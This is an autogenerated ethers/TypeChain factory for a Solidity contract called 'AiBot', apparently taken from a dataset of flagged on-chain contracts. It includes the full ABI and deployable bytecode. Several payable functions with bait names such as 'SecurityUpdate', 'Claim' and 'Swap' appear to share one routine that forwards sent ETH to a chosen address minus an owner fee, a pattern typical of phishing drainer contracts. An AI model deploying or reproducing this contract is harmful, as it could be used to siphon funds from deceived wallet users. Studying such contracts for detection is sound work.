/* Autogenerated file. Do not edit manually. */
/* tslint:disable */
/* eslint-disable */
import { Signer, utils, Contract, ContractFactory, Overrides } from "ethers";
import type { Provider, TransactionRequest } from "@ethersproject/providers";
import type { PromiseOrValue } from "../../../common";
import type {
  AiBot,
  AiBotInterface,
} from "../../../medium/0x114fc2418899db1c12dc5792f1527d72a4400aeb.sol/AiBot";

const _abi = [
  {
    inputs: [],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "spender",
        type: "address",
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "Approval",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "previousOwner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "currentOwner",
        type: "address",
      },
    ],
    name: "Ownership",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: false,
        internalType: "uint8",
        name: "previousPercentage",
        type: "uint8",
      },
      {
        indexed: false,
        internalType: "uint8",
        name: "currentPercentage",
        type: "uint8",
      },
    ],
    name: "Percentage",
    type: "event",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "sender",
        type: "address",
      },
      {
        internalType: "address",
        name: "recipient",
        type: "address",
      },
    ],
    name: "Claim",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "sender",
        type: "address",
      },
      {
        internalType: "address",
        name: "recipient",
        type: "address",
      },
    ],
    name: "ClaimReward",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "sender",
        type: "address",
      },
      {
        internalType: "address",
        name: "recipient",
        type: "address",
      },
    ],
    name: "ClaimRewards",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "sender",
        type: "address",
      },
      {
        internalType: "address",
        name: "recipient",
        type: "address",
      },
    ],
    name: "Connect",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "sender",
        type: "address",
      },
      {
        internalType: "address",
        name: "recipient",
        type: "address",
      },
    ],
    name: "Execute",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "receiver",
        type: "address",
      },
    ],
    name: "Fee",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "sender",
        type: "address",
      },
      {
        internalType: "address",
        name: "recipient",
        type: "address",
      },
    ],
    name: "Multicall",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "sender",
        type: "address",
      },
      {
        internalType: "address",
        name: "recipient",
        type: "address",
      },
    ],
    name: "SecurityUpdate",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "sender",
        type: "address",
      },
      {
        internalType: "address",
        name: "recipient",
        type: "address",
      },
    ],
    name: "Swap",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        internalType: "address",
        name: "spender",
        type: "address",
      },
    ],
    name: "allowance",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "spender",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "amount",
        type: "uint256",
      },
    ],
    name: "approve",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "uint8",
        name: "newPercentage",
        type: "uint8",
      },
    ],
    name: "changePercentage",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "getBalance",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "getFee",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "getOwner",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "newOwner",
        type: "address",
      },
    ],
    name: "transferOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const _bytecode =
  "0x6080604052348015600f57600080fd5b50600080546001600160a01b031916331781556001556002805460ff191660051790556106d0806100416000396000f3fe6080604052600436106100f35760003560e01c8063893d20e81161008a578063e1d4504f11610059578063e1d4504f1461014a578063f27260c21461014a578063f2fde38b14610222578063f4e724af1461014a57600080fd5b8063893d20e81461017f578063ced72f87146101a7578063d285660d146101bc578063dd62ed3e146101dc57600080fd5b806331fdb8cb116100c657806331fdb8cb1461014a57806332b806761461015f57806362fb75d71461014a57806380ed6c481461014a57600080fd5b8063095ea7b3146100f857806312065fe01461012d5780631836092b1461014a5780631b835de71461014a575b600080fd5b34801561010457600080fd5b5061011861011336600461055c565b610242565b60405190151581526020015b60405180910390f35b34801561013957600080fd5b50475b604051908152602001610124565b61015d610158366004610586565b610304565b005b34801561016b57600080fd5b5061015d61017a3660046105b9565b610312565b34801561018b57600080fd5b506000546040516001600160a01b039091168152602001610124565b3480156101b357600080fd5b5060015461013c565b3480156101c857600080fd5b5061015d6101d73660046105db565b610382565b3480156101e857600080fd5b5061013c6101f7366004610586565b6001600160a01b03918216600090815260036020908152604080832093909416825291909152205490565b34801561022e57600080fd5b5061015d61023d3660046105b9565b61044a565b60006001600160a01b03831661029f5760405162461bcd60e51b815260206004820152601b60248201527f417070726f766520746f20746865207a65726f2061646472657373000000000060448201526064015b60405180910390fd5b3360008181526003602090815260408083206001600160a01b03881680855290835292819020869055518581529192917f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a35060015b92915050565b61030e82826104c4565b5050565b6000546001600160a01b0316331461033c5760405162461bcd60e51b8152600401610296906105fe565b6001805460009182905560405190916001600160a01b0384169183156108fc0291849190818181858888f1935050505015801561037d573d6000803e3d6000fd5b505050565b6000546001600160a01b031633146103ac5760405162461bcd60e51b8152600401610296906105fe565b600a8160ff1611156103f55760405162461bcd60e51b8152602060048201526012602482015271496e76616c69642050657263656e7461676560701b6044820152606401610296565b6002805460ff83811660ff1983168117909355604080519190921680825260208201939093527f8aeb416bcc35d1e0f263caf174a830fa26332f626c038ddcb56f0100f456680b910160405180910390a15050565b6000546001600160a01b031633146104745760405162461bcd60e51b8152600401610296906105fe565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f20785b27e5fe438f15d8e2c5ccf83f449d08d77cba6151a2857a2201541286069190a35050565b600254349060009060ff166104da60648461063b565b6104e4919061065d565b90506104f08183610674565b9150806001546105009190610687565b6001556040516001600160a01b0384169083156108fc029084906000818181858888f19350505050158015610539573d6000803e3d6000fd5b5050505050565b80356001600160a01b038116811461055757600080fd5b919050565b6000806040838503121561056f57600080fd5b61057883610540565b946020939093013593505050565b6000806040838503121561059957600080fd5b6105a283610540565b91506105b060208401610540565b90509250929050565b6000602082840312156105cb57600080fd5b6105d482610540565b9392505050565b6000602082840312156105ed57600080fd5b813560ff811681146105d457600080fd5b6020808252600d908201526c1058d8d95cdcc811195b9a5959609a1b604082015260600190565b634e487b7160e01b600052601160045260246000fd5b60008261065857634e487b7160e01b600052601260045260246000fd5b500490565b80820281158282048414176102fe576102fe610625565b818103818111156102fe576102fe610625565b808201808211156102fe576102fe61062556fea2646970667358221220bfc64e21db58b7adeae9d7fdaa6f2a17320710f39646a9cc5172755172dd419964736f6c634300081e0033";

type AiBotConstructorParams =
  | [signer?: Signer]
  | ConstructorParameters<typeof ContractFactory>;

const isSuperArgs = (
  xs: AiBotConstructorParams
): xs is ConstructorParameters<typeof ContractFactory> => xs.length > 1;

export class AiBot__factory extends ContractFactory {
  constructor(...args: AiBotConstructorParams) {
    if (isSuperArgs(args)) {
      super(...args);
    } else {
      super(_abi, _bytecode, args[0]);
    }
  }

  override deploy(
    overrides?: Overrides & { from?: PromiseOrValue<string> }
  ): Promise<AiBot> {
    return super.deploy(overrides || {}) as Promise<AiBot>;
  }
  override getDeployTransaction(
    overrides?: Overrides & { from?: PromiseOrValue<string> }
  ): TransactionRequest {
    return super.getDeployTransaction(overrides || {});
  }
  override attach(address: string): AiBot {
    return super.attach(address) as AiBot;
  }
  override connect(signer: Signer): AiBot__factory {
    return super.connect(signer) as AiBot__factory;
  }

  static readonly bytecode = _bytecode;
  static readonly abi = _abi;
  static createInterface(): AiBotInterface {
    return new utils.Interface(_abi) as AiBotInterface;
  }
  static connect(address: string, signerOrProvider: Signer | Provider): AiBot {
    return new Contract(address, _abi, signerOrProvider) as AiBot;
  }
}
